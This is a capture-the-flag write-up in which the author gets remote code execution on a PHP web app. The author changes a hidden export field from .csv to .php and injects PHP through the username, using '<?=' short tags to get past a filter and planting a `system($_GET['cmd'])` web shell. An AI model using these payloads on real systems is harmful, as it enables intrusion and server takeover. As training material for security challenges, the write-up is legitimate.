# Challenge:

Black Pink in My Dinh

FLAG Format: EHC{XXX}

# Solution:

First when we come up with the website there only `login` and `register` can work. Try to register a simple account. Login and we got something like log

A button say `Export to CSV`. Click and we have a notification say

Go to `file/45748278064a7c3ab066882.26555608.csv` and we got somthing like output of a excel file.

First, I try to CSV injection but non of them work. Notice the challenge name is about php, finding again and we find a `hidden` in source code

The `value` have a string end with `.csv` in the end. Let's try to change it to php and export again if they work?

They worked, i can control the file type now.

The only input we got is the `username`. Try to register a username like this: `<?php phpinfo(); ?>` and we can LMAO üòÉ. Login again and we see this

I notice the `#` after the `<?php` look like it has been filter, i predict that won't work when export to php file and i'm, right

Search google is there anyway to start the php code without using `<?php`. And i got a result

So let change the payload to this: `<?= phpinfo() ?>` and woala üëè

We got the right way. Try payload `<?= system("ls -la"); ?>`

![image](https://github.com/Katsumi1012/CTF/assets/90083485/712188e0-f054-461f-84aa-2e7a9bb9955d)

Oh no. We got some error here. it's look like some how, they treat `ls` to a variable‚ùì Maybe the error from `"` because the server echo something out and the `"` get enter close the echo and we get error at `ls`. This time try `<?= system('ls -la'); ?>` and we get result

We know all the trick around here. So this time i use this `<?= system($_GET['cmd']);?>` to not register over and over.

And i found the `flag.txt` file üòô
